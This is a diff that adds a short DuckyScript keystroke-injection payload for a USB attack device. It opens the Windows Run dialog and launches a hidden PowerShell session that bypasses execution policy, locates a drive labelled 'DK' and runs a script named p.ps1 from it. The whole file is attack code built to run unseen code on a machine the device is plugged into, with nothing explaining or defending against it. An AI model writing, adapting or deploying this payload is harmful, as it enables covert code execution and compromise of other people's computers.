@@ -1,0 +1,4 @@
+DELAY 1000
+GUI r
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "$uP = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'DK' } | select name; cd $uP.name; .\p.ps1"
+ENTER
